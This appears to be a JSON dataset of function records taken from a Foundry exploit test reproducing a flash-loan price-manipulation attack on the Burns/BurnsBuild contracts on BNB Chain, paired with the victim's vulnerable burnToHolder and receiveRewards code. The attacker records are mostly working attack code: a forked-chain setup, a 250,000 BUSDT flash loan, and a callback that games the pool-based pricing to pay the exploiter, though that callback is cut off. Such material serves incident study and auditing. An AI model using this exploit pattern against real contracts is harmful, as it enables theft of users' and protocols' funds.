[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DSPFlashLoanCall",
    "original_code": "    function DSPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        BUSDTToBurns(baseAmount);\n\n        address[] memory path = new address[](2);\n        path[0] = address(Burns);\n        path[1] = address(WBNB);\n        uint256 amountOut1 = 50e18;\n        uint256 amountOut2 = address(Burns).balance - amountOut1;\n        uint256[] memory amounts = PancakeRouter.getAmountsIn(amountOut1, path);\n\n        // burnToHolder() use getAmountsOut() and Burns/WBNB pair for making calculations\n        BurnsBuild.burnToHolder(amounts[0], exploiter);\n        amounts = PancakeRouter.getAmountsIn(amountOut2, path);\n        BurnsBuild.burnToHolder(amounts[0], exploiter);\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 35_858_189);\n        vm.label(address(BUSDT), \"BUSDT\");\n        vm.label(address(Burns), \"Burns\");\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(DSP), \"DSP\");\n        vm.label(address(BUSDT_WBNB), \"BUSDT_WBNB\");\n        vm.label(address(Burns_WBNB), \"Burns_WBNB\");\n        vm.label(address(PancakeRouter), \"PancakeRouter\");\n        vm.label(address(BurnsBuild), \"BurnsBuild\");\n        vm.label(exploiter, \"Exploiter\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(BUSDT), address(this), 0);\n        deal(address(this), 0);\n        emit log_named_decimal_uint(\n            \"Exploiter BUSDT balance before attack\", BUSDT.balanceOf(exploiter), BUSDT.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Exploiter Burns balance before attack\", Burns.balanceOf(exploiter), Burns.decimals()\n        );\n        // Borrow BUSDT\n        bytes memory data = abi.encodePacked(uint8(49));\n        DSP.flashLoan(250_000 * 1e18, 0, address(this), data);\n\n        emit log_named_decimal_uint(\n            \"Exploiter BUSDT balance after attack\", BUSDT.balanceOf(exploiter), BUSDT.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter Burns balance after attack\", Burns.balanceOf(exploiter), Burns.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBurnsBuild",
    "source_type": "victim_contract",
    "function_name": "burnToHolder",
    "original_code": "    function burnToHolder(uint256 amount, address _invitation) external {\n        address sender = _msgSender();\n        require(amount >= 0, \"TeaFactory: insufficient funds\");\n\n        if (\n            Invitation[sender] == address(0) &&\n            _invitation != address(0) &&\n            _invitation != sender\n        ) {\n            Invitation[sender] = _invitation;\n            InvitationList[_invitation].add(sender);\n        }\n        if (!userList.contains(sender)) {\n            userList.add(sender);\n        }\n        address[] memory path = new address[](2);\n        path[0] = address(_burnsToken);\n        path[1] = uniswapRouter.WETH();\n\n        uint256 deserved = uniswapRouter.getAmountsOut(amount, path)[\n            path.length - 1\n        ];\n        require(\n            payable(address(_burnsToken)).balance >= deserved,\n            \"not enough balance\"\n        );\n        _burnsToken.burnToholder(sender, amount, deserved);\n        _BurnTokenToDead(sender, amount);\n        burnFeeRewards(sender, deserved);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IBurnsBuild",
    "source_type": "victim_contract",
    "function_name": "receiveRewards",
    "original_code": "    function receiveRewards(address payable to) external {\n        address addr = msg.sender;\n        uint256 balance = _balanceOf(addr);\n        //  uint256 amount = balance.sub(burnAmount[addr]); //.sub(Rewards[addr]);\n        uint256 amount = canRewards(addr);\n        require(amount > 0, \"Unable to receive rewards\");\n        Rewards[addr] = Rewards[addr].add(amount);\n        historyRewards[addr] = historyRewards[addr].add(amount);\n        to.transfer(amount.mul(10 ** 9));\n\n        _transfer(addr, address(this), balance);\n        //\u7528\u6237\u6ea2\u51fa\u90e8\u5206,\u7ed9\u5168\u76d8\u5206\u7ea2\n        if (balance.sub(burnAmount[addr]) > amount) {\n            uint256 increase = balance.sub(burnAmount[addr]).sub(amount);\n            arriveRewards(increase);\n        }\n\n        burnAmount[addr] = 0;\n        totalReceive = totalReceive.add(amount);\n        emit ReceiveReward(addr, amount, totalReceive);\n    }\n\n",
    "description": ""
  }
]